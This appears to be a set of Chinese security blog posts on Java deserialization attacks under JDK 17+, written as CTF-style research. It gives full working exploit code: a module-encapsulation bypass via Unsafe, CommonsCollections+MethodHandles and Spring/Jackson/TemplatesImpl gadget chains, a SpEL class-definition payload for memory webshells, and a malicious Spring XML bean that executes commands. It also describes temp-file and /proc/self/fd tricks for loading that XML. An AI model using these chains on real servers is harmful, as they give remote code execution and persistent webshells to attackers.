的可维护性、可扩展性和安全性，同时改善大型应用程序和库的构建和管理。模块化可以比作建造一座房子，将其分成多个功能明确的房间。每个房间（模块）负责特定的任务，如客厅用于接待、厨房用于做饭等，这样使得整个房子（软件项目）结构清晰、易于理解和维护。模块之间互不干扰，减少了功能冲突，允许独立开发和测试，提升了开发效率。此外，模块化还可以按需加载，节省资源，并使得维护工作变得更加简单，只需修复出现问题的模块，而不影响其他部分。\n不过，jdk9时，模块化机制对我们进行反序列化没有实际影响，只是会打印警告而已，并不会直接报错中断。\n模块化的强封装是从jdk17开始的。任何对java.*代码中的非public变量和方法进行反射会抛出InaccessibleObjectException异常。\n但是每个模块中有一个module-info.java文件，里面定义了模块中的哪些包可以被外部访问，以及本模块依赖于哪些包。\n1、export\n\n通过 exports 声明的包中的公共类和接口可以被其他模块访问。\n如果没有exports的话，你自己的类都没法去new\n2、requires\n\n表示依赖哪个模块。transitive表示隐式依赖。在这种情况下，任何使用了 java.desktop 模块的代码都能隐式的使用 java.xml 模块中的类。例如，如果 java.desktop 模块中某个方法返回了一个来自于 java.xml 模块中的类型，那么使用 java.desktop 模块的代码就间接依赖 java.xml 模块，如果没有 transitive 的话，那么使用 java.desktop 模块的模块就必须显式声明依赖 java.xml 模块才能正常编译，否则 java.xml 模块是不可见的。\n3、opens\n\n表示哪些包是对外开放的，即可以被反射调用。有to的话，就是指定对哪个模块开放。\npublic class Failed &#123;    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;        byte[] bytes = Files.readAllBytes(Paths.get(&quot;Calc.class&quot;));        Method method = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);        method.setAccessible(true);        Class clazzLoader = (Class) method.invoke(ClassLoader.getSystemClassLoader(), bytes, 0, bytes.length);        clazzLoader.newInstance();        // 抛出：Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int)        // throws java.lang.ClassFormatError accessible: module java.base does not &quot;opens java.lang&quot; to unnamed module @6f496d9f    &#125;&#125;\n\n上面这段代码，在jdk8可以实现构造方法执行，但在jdk17中，会报错。\n从抛出的异常中可以知道，java.base模块中的java.lang包没有对uname模块开放，也就是没有对我们自定义的类开放。\n源码分析去看java.lang.reflect.AccessibleObject#checkCanSetAccessible(java.lang.Class, java.lang.Class, boolean)\n\n这里有三种方法能返回true：\n1、调用类（自己的类）的模块和被调用类的模块名相同\n2、调用类的模块和Object类的模块相同，即java.base\n3、被调用类的模块是未命名的\n这里我们会选择第一种，因为callerModule是通过caller.getModule获取的，我们也许能直接修改里面的module字段。方法二也可以，但是不通用，setAccessible能通过，但是其他反射调用，比如newInstance的时候就不一定行。\n\n往下看，还有三种方法能返回true。前两个的先决条件是：被调用类是public，被调用类所在的包被exports了\n1、被调用的方法或字段是public的\n2、被调用的方法或字段是protect-static的，且调用者是被调用者的子类\n3、被调用的包对调用者是open的\n这三种都不考虑，因为这些都是直接写死在代码里的，没有操作空间。\n绕过方法patchModule要用到Unsafe类，这个类提供了类似C语言的指针操作，能够直接修改对象中的字段值。\n首先，Unsafe类是opens的：\n\n所以咱们可以直接在自己的类中使用。\nUnsafe类中有几个关键方法：\n\nobjectFieldOffset：获取字段的偏移量\n\ngetAndSetObject：获取一个对象在特定内存偏移量上的当前值，并将其替换为一个新值。\n\nputObject：用于将一个对象（或引用）写入到指定对象的内存偏移量\nputObject和getAndSetObject方法功能很相似，不过getAndSetObject会返回被替换的旧值，当然里面细节也有所不同，比如getAndSetObject会使用原子操作保障同时执行读取和写入。不过就我们修改类的Class对象的moudle属性来说，两者都可以。\n\n这里callerModule是通过caller.getModule()获取的，而caller是一个Class对象。当调用类，也就是我们自己的类加载到JVM时，会产生一个Class对象，这个Class对象是唯一的，里面的Module字段也是唯一的。所以，我们能够保证修改成功。\n最终代码：\npackage com.test;import sun.misc.Unsafe;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;public class ModuleBypass &#123;    public static void main(String[] args) throws Exception &#123;        patchModule(ModuleBypass.class, ClassLoader.class);        byte[] bytes = Files.readAllBytes(Paths.get(&quot;Calc.class&quot;));        Method method = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);        method.setAccessible(true);        Class clazzLoader = (Class) method.invoke(ClassLoader.getSystemClassLoader(), bytes, 0, bytes.length);        clazzLoader.newInstance();    &#125;    public static void patchModule(Class current, Class target) throws Exception &#123;        Field field = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);        field.setAccessible(true);        Unsafe unsafe = (Unsafe) field.get(null);        // 所有Class的数据结构都是一样的，相同字段的偏移量也是一样的        long l = unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;));        Module targetModule = target.getModule();        unsafe.putObject(current, l, targetModule);    &#125;&#125;\n\n\n\n增加虚拟机参数选项由于上面的过程只是为了能够在本地调用其他模块，所以也可以通过添加虚拟机参数选项的方法实现。\n\n需要注意的是，如果反序列化过程中，有第三方组件对jdk中的模块进行反射调用，就不能通过这种方式去修改。否则，虽然你本地可以打通，但是远程是打不通的，因为远程的JVM可没有打开这个选项。上面的patchModule也是同样的道理。必须在反序列化过程中，执行patchModule才行。\n补充java.lang.reflect.Constructor#newInstance–&gt;java.lang.reflect.AccessibleObject#checkAccess–&gt;java.lang.reflect.AccessibleObject#verifyAccess–&gt;java.lang.reflect.AccessibleObject#slowVerifyAccess–&gt;jdk.internal.reflect.Reflection#verifyModuleAccess–&gt;java.lang.Module#isExported(java.lang.String, java.lang.Module)–&gt;java.lang.Module#implIsExportedOrOpen–&gt;java.lang.Module#isStaticallyExportedOrOpen–&gt;java.lang.Module#allows\nnewInstance反射最终是这样绕过的，所以上面patchModule才选择使调用者和被调用者的模块一致，而不是简单地使调用者的模块为java.base\n这里的绕过可以看这篇文章：\nhttps://jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/\n参考https://mp.weixin.qq.com/s/Nvra3OljzllryYg9L9yCFQ\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"jdk17+MethodHandles+CC","url":"/2025/09/23/jdk17-MethodHandles-CC/","content":"这个链最先在2024极客巅峰ez_java中出现\n类加载的地方在java.lang.invoke.MethodHandles.Lookup#defineClass\n类加载分析\n传入的参数就是类的bytecode，跟进makeClassDefiner：\n\n这里lookupClass().getPackageName()就是获取调用者的包名。我们是通过InvokerTransformer去调的，所以这里的包名就是org.apache.commons.collections.functors\n跟进newInstance：\n\n这里是最重要的部分，必须保证我们的恶意类和调用者所在的包是相同的，这样才不会抛出报错。\n这样就能完成类加载的过程，不过并没有进行实例化，所以还需要通过org.apache.commons.collections.functors.InstantiateTransformer#transform来对恶意类进行实例化，从而触发无参构造或者静态代码块。\n这里还需要想办法获取MethodHandles的内部类Lookup。不过MethodHandles提供了一个方法能直接让我们获取：\n\nExp这里用的是CC6\npackage com.test;import javassist.CannotCompileException;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.*;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.invoke.MethodHandles;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class Exp &#123;    public static void main(String[] args) throws CannotCompileException, IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123;        ClassPool pool = ClassPool.getDefault();        pool.importPackage(&quot;java.io&quot;);        // 调用者和被调用者的包名一致，才能通过java.lang.invoke.MethodHandles.Lookup.ClassFile.newInstance里的判断        CtClass ctClass = pool.makeClass(&quot;org.apache.commons.collections.functors.Calc&quot;);        CtConstructor ctConstructor = new CtConstructor(new CtClass[]&#123;&#125;, ctClass);        ctConstructor.setBody(&quot;        try &#123;\\n&quot; +                &quot;            Runtime.getRuntime().exec(\\&quot;calc\\&quot;);\\n&quot; +                &quot;        &#125; catch (IOException e) &#123;\\n&quot; +                &quot;            throw new RuntimeException(e);\\n&quot; +                &quot;        &#125;&quot;);        ctClass.addConstructor(ctConstructor);        byte[] bytecode = ctClass.toBytecode();//        ctClass.writeFile(&quot;Calc.class&quot;);        ConstantTransformer constantTransformer = new ConstantTransformer(MethodHandles.class);        InvokerTransformer invokerTransformer1 = new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;lookup&quot;, new Class[]&#123;&#125;&#125;);        InvokerTransformer invokerTransformer2 = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;);        InvokerTransformer invokerTransformer3 = new InvokerTransformer(&quot;defineClass&quot;, new Class[]&#123;byte[].class&#125;, new Object[]&#123;bytecode&#125;);        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[0], new Object[0]);        Transformer[] transformers = &#123;constantTransformer,invokerTransformer1,invokerTransformer2,invokerTransformer3, instantiateTransformer&#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; inner = new HashMap&lt;&gt;();        Map lazyMap = LazyMap.decorate(inner, new ConstantFactory(&quot;123&quot;));        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;useless&quot;);        HashMap&lt;Object, Object&gt; finalMap = new HashMap&lt;&gt;();        finalMap.put(tiedMapEntry, &quot;any&quot;);        inner.remove(&quot;useless&quot;);        lazyMap.remove(&quot;useless&quot;);        setFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);//        setFieldValue(chainedTransformer, &quot;iTransformers&quot;, transformers);        FileOutputStream fos = new FileOutputStream(&quot;mh.bin&quot;);        ObjectOutputStream oos = new ObjectOutputStream(fos);        oos.writeObject(finalMap);        oos.close();        FileInputStream fis = new FileInputStream(&quot;mh.bin&quot;);        ObjectInputStream ois = new ObjectInputStream(fis);        ois.readObject();        ois.close();    &#125;    public static void setFieldValue (Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj, value);    &#125;&#125;\n\n\n\n\n\n\n\n参考https://xz.aliyun.com/news/14807\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"jdk17+Springboot链","url":"/2025/09/23/jdk17-Springboot%E9%93%BE/","content":"先列一下涉及到的知识点：\n1、jackson反序列化链，POJONode，toString–&gt;getter\n2、EventListenerList链，readObject–&gt;toString，jdk17可用\n3、jdk17怎么利用TemplatesImpl(不继承AbstractTranslet)进行类加载\n4、JdkDynamicAopProxy解决jackson链中，getter无法稳定触发的问题\n5、JdkDynamicAopProxy解决POJONode因为模块化无法直接调用getOutputProperties的问题\n这里主要解决的问题是3、5，其他问题都是老生常谈的了，可以自己找文章看看。\n问题3可以参考：\nhttps://whoopsunix.com/docs/PPPYSO/advance/TemplatesImpl/#0x02-%E5%8E%BB%E9%99%A4-abstracttranslet-%E9%99%90%E5%88%B6\n我的另一篇博客里也涉及了这个问题：\nhttps://1diot9.github.io/2025/09/23/jdk17%E5%88%A9%E7%94%A8TemplatesImpl/\n主要解决方法就是在bytecodes[][]里塞两个，即new byte[][]{byte1, byte2}\n并且通过反射设置_transletIndex的值。\n问题5的大致原理是，TemplatesImpl套上动态代理后，其对外开放的接口就变成了javax.xml.transform.Templates。这个类是public的，而且exports出来的，所以uname的类也可以直接调用。\n\n给出exp：\npackage com.test;import com.fasterxml.jackson.databind.JsonNode;import com.fasterxml.jackson.databind.node.POJONode;import javassist.*;import javassist.util.proxy.DefineClassHelper;import org.springframework.aop.framework.AdvisedSupport;import javax.swing.event.EventListenerList;import javax.swing.undo.UndoManager;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.Vector;public class MyExp &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass jsonNode = pool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);        CtMethod writeReplace = jsonNode.getDeclaredMethod(&quot;writeReplace&quot;);        jsonNode.removeMethod(writeReplace);        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();        jsonNode.toClass(classLoader, null);        byte[] bytes = getTemplates();        byte[] bytecode = ClassPool.getDefault().makeClass(&quot;useless&quot;).toBytecode();        Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);        bypassModule.patchModule(MyExp.class, aClass);        Object templates = aClass.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;bytes, bytecode&#125;);        setFieldValue(templates, &quot;_name&quot;, &quot;any&quot;);        setFieldValue(templates, &quot;_class&quot;, null);        setFieldValue(templates, &quot;_transletIndex&quot;, 0);        Object proxy = makeTemplatesImplAopProxy(templates);        POJONode node = new POJONode(proxy);        bypassModule.patchModule(MyExp.class, UndoManager.class);        EventListenerList eventListenerList = getEventListenerList(node);        FileOutputStream fos = new FileOutputStream(&quot;exp.bin&quot;);        ObjectOutputStream oos = new ObjectOutputStream(fos);        oos.writeObject(eventListenerList);        oos.close();        fos.close();        FileInputStream fis = new FileInputStream(&quot;exp.bin&quot;);        ObjectInputStream ois = new ObjectInputStream(fis);        ois.readObject();        ois.close();        fis.close();    &#125;    public static Object makeTemplatesImplAopProxy(Object templates) throws Exception &#123;        AdvisedSupport advisedSupport = new AdvisedSupport();        advisedSupport.setTarget(templates);        Constructor constructor = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;).getConstructor(AdvisedSupport.class);        constructor.setAccessible(true);        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Templates.class&#125;, handler);        return proxy;    &#125;    public static EventListenerList getEventListenerList(Object obj) throws Exception&#123;        EventListenerList list = new EventListenerList();        UndoManager undomanager = new UndoManager();        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。        Vector vector = (Vector) getFieldValue(undomanager, &quot;edits&quot;);        vector.add(obj);        setFieldValue(list, &quot;listenerList&quot;, new Object[]&#123;Class.class, undomanager&#125;);        return list;    &#125;    public static Object getFieldValue(Object obj, String fieldName) throws Exception &#123;        Field field = null;        Class c = obj.getClass();        for (int i = 0; i &lt; 5; i++) &#123;            try &#123;                field = c.getDeclaredField(fieldName);            &#125; catch (NoSuchFieldException e) &#123;                c = c.getSuperclass();            &#125;        &#125;        field.setAccessible(true);        return field.get(obj);    &#125;    public static byte[] getTemplates() throws CannotCompileException, IOException &#123;        ClassPool pool = ClassPool.getDefault();        pool.importPackage(&quot;java.io&quot;);        CtClass ctClass = pool.makeClass(&quot;Calc&quot;);        CtConstructor ctConstructor = ctClass.makeClassInitializer();        ctConstructor.setBody(&quot;try &#123;\\n&quot; +                &quot;            Runtime.getRuntime().exec(\\&quot;calc\\&quot;);\\n&quot; +                &quot;        &#125; catch (IOException e) &#123;\\n&quot; +                &quot;            throw new RuntimeException(e);\\n&quot; +                &quot;        &#125;&quot;);        byte[] bytecode = ctClass.toBytecode();        return bytecode;    &#125;    public static void setFieldValue(Object obj, String field, Object val) throws Exception &#123;        Field dField = obj.getClass().getDeclaredField(field);        dField.setAccessible(true);        dField.set(obj, val);    &#125;&#125;\n\n记得在虚拟机选项里添加参数：–add-opens&#x3D;java.base&#x2F;java.lang&#x3D;ALL-UNNAMED\n\n参考高版本JDK下的Spring原生反序列化链 – fushulingのblog\n上面这篇文章里，一开始提到的知识点基本都给出了相关文章，可以直接看。\n高版本jdk+springboot链子\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"Springboot_jdk17-22通杀内存马","url":"/2025/09/24/Springboot-jdk17-22%E9%80%9A%E6%9D%80%E5%86%85%E5%AD%98%E9%A9%AC/","content":"SpringBoot2.x.x内存马生成内存马生成可以用最新的jmg，把bypass jdk module看情况，jdk17+开了就行。\n工具选Behinder，中间件选SpringMVC或者Tomcat都行。\n字节码加载CC+MethodHandles最早出现在极客巅峰2024ez_java，也是没法用于shiro反序列化\n参考：\nhttps://xz.aliyun.com/news/14807\nCC+TemplatesImpl现在jdk17+已经能使用TemplatesImpl进行加载了。\n参考：\nhttps://jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/\n那么就正常加载字节码即可。\n注意，shiro反序列化用不了，因为shiro的类加载器只能加载jdk原生数组，而这里会用到Transform[]\nJdkDynamicAopProxy+TemplatesImpl一条springboot的原生链。shiro反序列化也能用。\n参考：\nhttps://fushuling.com/index.php/2025/08/21/%E9%AB%98%E7%89%88%E6%9C%ACjdk%E4%B8%8B%E7%9A%84spring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/\nhttps://1diot9.github.io/2025/09/23/jdk17-Springboot%E9%93%BE/\nSPEL首先说一下哪些地方能执行SPEL：\n1、写入xml，然后通过ClassPathXmlApplicationContext进行加载\n2、存在SPEL注入的地方，能调用SPEL的地方\n3、。。。还不知道\nT(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;org.springframework.expression.Test&#x27;,T(org.apache.commons.io.IOUtils).toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString(&#x27;gzip + Base64&#x27;)))),T(java.lang.Thread).currentThread().getContextClassLoader(),null,T(java.lang.Class).forName(&#x27;org.springframework.expression.ExpressionParser&#x27;))\n\n这里做了GZIP解压，因为不压缩的话，表达式长度超过10000，会触发报错，所以需要先行压缩一下。\n除了T(org.apache.commons.io.IOUtils).toByteArray，还可以使用T(org.springframework.util.StreamUtils).copyToByteArray，后者更普适一些。\n压缩用脚本，需要修改javaFilePath和javacPath变量：\npackage com.test;import java.io.*;import java.util.Base64;import java.util.ArrayList;import java.util.List;import java.util.zip.GZIPOutputStream;public class Zip &#123;    public static void main(String[] args) &#123;        // 内存马代码文件        String javaFilePath = &quot;Test.java&quot;;        String classFilePath = getClassNameFromJavaPath(javaFilePath) + &quot;.class&quot;;        // 输出&#x27;gzip + Base64&#x27;的恶意字节码到文件        String outputFilePath = &quot;SpELMemShell.txt&quot;;        try &#123;            // 编译 .java 文件            compileJavaFile(javaFilePath);            // 检查 .class 文件是否已生成            if (!new File(classFilePath).exists()) &#123;                throw new FileNotFoundException(&quot;The compiled class file was not generated.&quot;);            &#125;            // 压缩并编码 .class 文件            String base64String = compressAndEncodeClassFile(classFilePath);            // 写入文件            writeToFile(outputFilePath, base64String);        &#125; catch (IOException e) &#123;            System.err.println(&quot;Error processing the file: &quot; + e.getMessage());        &#125;    &#125;    private static void compileJavaFile(String javaFilePath) throws IOException &#123;        // 内存马中的Object.class.getModule()方法是在Java 9及更高版本中引入的，因此需要指定使用Java 9+的javac进行编译        String javacPath = &quot;D:\\\\sec_software\\\\jdks\\\\jdk-17.0.6\\\\bin\\\\javac.exe&quot;;        List&lt;String&gt; command = new ArrayList&lt;&gt;();        command.add(javacPath); // 使用 javac 的完整路径        command.add(&quot;-g:none&quot;);        command.add(&quot;-Xlint:unchecked&quot;);        command.add(&quot;-Xlint:deprecation&quot;);        command.add(javaFilePath);        ProcessBuilder processBuilder = new ProcessBuilder(command);        Process process = processBuilder.start();        // 等待编译完成        try &#123;            int exitCode = process.waitFor();            if (exitCode != 0) &#123;                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));                String line;                while ((line = errorReader.readLine()) != null) &#123;                    System.err.println(line);                &#125;                throw new RuntimeException(&quot;Compilation failed with exit code &quot; + exitCode);            &#125;        &#125; catch (InterruptedException e) &#123;            Thread.currentThread().interrupt();            throw new IOException(&quot;Compilation interrupted&quot;, e);        &#125;    &#125;    private static String compressAndEncodeClassFile(String classFilePath) throws IOException &#123;        byte[] classData = readFile(classFilePath);        // 使用 gzip 进行压缩        byte[] compressedData = compress(classData);        // 将压缩后的数据转换为 Base64 编码        String encodedCompressedData = Base64.getEncoder().encodeToString(compressedData);        // 输出原始长度和新的 Base64 编码长度        System.out.println(&quot;Original Base64 encoded string length: &quot; + classData.length);        System.out.println(&quot;New Base64 encoded string length after gzip compression: &quot; + encodedCompressedData.length());        return encodedCompressedData;    &#125;    private static byte[] readFile(String filePath) throws IOException &#123;        try (FileInputStream fis = new FileInputStream(filePath)) &#123;            byte[] data = new byte[fis.available()];            fis.read(data);            return data;        &#125;    &#125;    private static byte[] compress(byte[] data) throws IOException &#123;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        try (GZIPOutputStream gzos = new GZIPOutputStream(baos)) &#123;            gzos.write(data);        &#125;        return baos.toByteArray();    &#125;    private static void writeToFile(String filePath, String content) throws IOException &#123;        try (BufferedWriter writer = new BufferedWriter(new FileWriter(filePath))) &#123;            writer.write(content);        &#125;    &#125;    private static String getClassNameFromJavaPath(String javaFilePath) &#123;        String fileName = new File(javaFilePath).getName();        return fileName.substring(0, fileName.indexOf(&#x27;.&#x27;));    &#125;&#125;\n\n参考：\nhttps://mp.weixin.qq.com/s/xfmHjgx5jQRLKkIR7XUCcg\nSpringBoot3.x.x内存马生成还是用jmg，但是组件类型要改一下，中间件选Tomcat，组件类型选这两个：\nJakataFilter或JakataListener\nbypassmodule要开，springboot3只支持jdk17+\n字节码加载跟上面一样\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"jdk17+SPEL","url":"/2025/09/24/jdk17-SPEL/","content":"仅适用于能够执行SPEL表达式的情况\n这里跟前面CC+TemplatesImpl的区别在于，到达defineClass的方法不同了，前面都是通过反序列化，而这里是直接通过SPEL表达式。所以这里的主要目标是：怎么样才能执行SPEL\n首先说一下哪些地方能执行SPEL：\n1、写入xml，然后通过ClassPathXmlApplicationContext进行加载 （临时文件法，其他任意写漏洞）\n2、存在SPEL注入的地方，能调用SPEL的地方\n3、。。。还不知道\nT(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;org.springframework.expression.Test&#x27;,T(org.apache.commons.io.IOUtils).toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString(&#x27;gzip + Base64&#x27;)))),T(java.lang.Thread).currentThread().getContextClassLoader(),null,T(java.lang.Class).forName(&#x27;org.springframework.expression.ExpressionParser&#x27;))\n\n这里做了GZIP解压，因为不压缩的话，表达式长度超过10000，会触发报错，所以需要先行压缩一下。\n除了T(org.apache.commons.io.IOUtils).toByteArray，还可以使用T(org.springframework.util.StreamUtils).copyToByteArray，后者更普适一些。\n压缩用脚本，需要修改javaFilePath和javacPath变量：\npackage com.test;import java.io.*;import java.util.Base64;import java.util.ArrayList;import java.util.List;import java.util.zip.GZIPOutputStream;public class Zip &#123;    public static void main(String[] args) &#123;        // 内存马代码文件        String javaFilePath = &quot;Test.java&quot;;        String classFilePath = getClassNameFromJavaPath(javaFilePath) + &quot;.class&quot;;        // 输出&#x27;gzip + Base64&#x27;的恶意字节码到文件        String outputFilePath = &quot;SpELMemShell.txt&quot;;        try &#123;            // 编译 .java 文件            compileJavaFile(javaFilePath);            // 检查 .class 文件是否已生成            if (!new File(classFilePath).exists()) &#123;                throw new FileNotFoundException(&quot;The compiled class file was not generated.&quot;);            &#125;            // 压缩并编码 .class 文件            String base64String = compressAndEncodeClassFile(classFilePath);            // 写入文件            writeToFile(outputFilePath, base64String);        &#125; catch (IOException e) &#123;            System.err.println(&quot;Error processing the file: &quot; + e.getMessage());        &#125;    &#125;    private static void compileJavaFile(String javaFilePath) throws IOException &#123;        // 内存马中的Object.class.getModule()方法是在Java 9及更高版本中引入的，因此需要指定使用Java 9+的javac进行编译        String javacPath = &quot;D:\\\\sec_software\\\\jdks\\\\jdk-17.0.6\\\\bin\\\\javac.exe&quot;;        List&lt;String&gt; command = new ArrayList&lt;&gt;();        command.add(javacPath); // 使用 javac 的完整路径        command.add(&quot;-g:none&quot;);        command.add(&quot;-Xlint:unchecked&quot;);        command.add(&quot;-Xlint:deprecation&quot;);        command.add(javaFilePath);        ProcessBuilder processBuilder = new ProcessBuilder(command);        Process process = processBuilder.start();        // 等待编译完成        try &#123;            int exitCode = process.waitFor();            if (exitCode != 0) &#123;                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));                String line;                while ((line = errorReader.readLine()) != null) &#123;                    System.err.println(line);                &#125;                throw new RuntimeException(&quot;Compilation failed with exit code &quot; + exitCode);            &#125;        &#125; catch (InterruptedException e) &#123;            Thread.currentThread().interrupt();            throw new IOException(&quot;Compilation interrupted&quot;, e);        &#125;    &#125;    private static String compressAndEncodeClassFile(String classFilePath) throws IOException &#123;        byte[] classData = readFile(classFilePath);        // 使用 gzip 进行压缩        byte[] compressedData = compress(classData);        // 将压缩后的数据转换为 Base64 编码        String encodedCompressedData = Base64.getEncoder().encodeToString(compressedData);        // 输出原始长度和新的 Base64 编码长度        System.out.println(&quot;Original Base64 encoded string length: &quot; + classData.length);        System.out.println(&quot;New Base64 encoded string length after gzip compression: &quot; + encodedCompressedData.length());        return encodedCompressedData;    &#125;    private static byte[] readFile(String filePath) throws IOException &#123;        try (FileInputStream fis = new FileInputStream(filePath)) &#123;            byte[] data = new byte[fis.available()];            fis.read(data);            return data;        &#125;    &#125;    private static byte[] compress(byte[] data) throws IOException &#123;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        try (GZIPOutputStream gzos = new GZIPOutputStream(baos)) &#123;            gzos.write(data);        &#125;        return baos.toByteArray();    &#125;    private static void writeToFile(String filePath, String content) throws IOException &#123;        try (BufferedWriter writer = new BufferedWriter(new FileWriter(filePath))) &#123;            writer.write(content);        &#125;    &#125;    private static String getClassNameFromJavaPath(String javaFilePath) &#123;        String fileName = new File(javaFilePath).getName();        return fileName.substring(0, fileName.indexOf(&#x27;.&#x27;));    &#125;&#125;\n\n参考https://mp.weixin.qq.com/s/xfmHjgx5jQRLKkIR7XUCcg\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"ClassPathXml利用","url":"/2025/10/01/ClassPathXml%E5%88%A9%E7%94%A8/","content":"ClassPathXml这里的利用关键是，能不能上传xml文件到可控路径。\nPostgreSql写入ascii.jar!&#x2F;exp.xml首先，需要明白有这么几个事实\n1、jar文件本质就是zip\n2、zip文件在文件前后添加脏字符，不影响文件本身\n3、xml文件前后不能出现脏字符\n4、ClassPathXml读取文件时，文件不能出现非ascii字符。jar:file:&#x2F;&#x2F;&#x2F;D:&#x2F;ascii.jar!&#x2F;1.xml时，ascii.jar中也不能出现非ascii字符\n5、postgresql通过漏洞写文件时，前后会出现脏字符\n接下来讲漏洞利用。\n首先创建exp.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;        &lt;constructor-arg&gt;            &lt;list&gt;                &lt;value&gt;cmd&lt;/value&gt;                &lt;value&gt;/c&lt;/value&gt;                &lt;value&gt;calc&lt;/value&gt;            &lt;/list&gt;        &lt;/constructor-arg&gt;    &lt;/bean&gt;&lt;/beans&gt;\n\n接下来利用https://github.com/c0ny1/ascii-jar 项目的ascii-jar-2.py，制作全都是ascii范围内的jar包。注意PADDING_DATA要放到末尾，因为xml文件开头是固定的。\n\n制作出来的jar包，范围都在00~7F内：\n\n接下来对jar包进行URL编码，这里使用Java脚本，如果用python的话，一定要确定自己编码后的格式正确：\npublic class UrlEncodeFile &#123;    public static void main(String[] args) throws IOException &#123;        byte[] bytes = Files.readAllBytes(Paths.get(&quot;./ascii.jar&quot;));        String encode = URLEncoder.encode(new String(bytes), &quot;utf-8&quot;);        System.out.println(encode);    &#125;&#125;\n\n然后通过postgre漏洞写文件：\n\n最后通过ClassPathXml读取：\n\nspringboot临时文件法一个请求发送一个请求，其中带有临时文件和xml加载路径。\n\n异步请求先发送临时文件请求，主要目标是这个临时文件要长期存活。\n可以通过修改Content-Length + 删掉 boundary  + 大段空格 实现。\n\n然后再正常发送另一个利用请求即可\n爆破fd通过 file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;xxx 去访问产生的临时文件，这里解释一下。\n一般获取一个进程的信息时，是通过 &#x2F;proc&#x2F;pid 的方式去获取。但是一个进程如果想获取自身的信息，再去填pid就显得多此一举。所以提供了 &#x2F;proc&#x2F;self 的方式，允许进程直接访问自身信息。所以，对应不同进程来说，&#x2F;proc&#x2F;self 的结果是不一样的。而fd目录是file descriptor，文件描述符，该目录存储了指向当前进程操作过的文件的软连接，以数字0开始命名，通过它可以获取进程中有关的配置文件等。所以可以通过遍历 fd 的方式去加载临时文件。\n顺便补充一下 &#x2F;proc 里面的其他目录。\n&#x2F;proc&#x2F;pid&#x2F;cmdline存储了启动该进程的shell命令\ncwd是一个软连接，指向进程运行目录\nenviron文件存储了进程的环境变量\n详细请搜索：Linux 进程信息目录 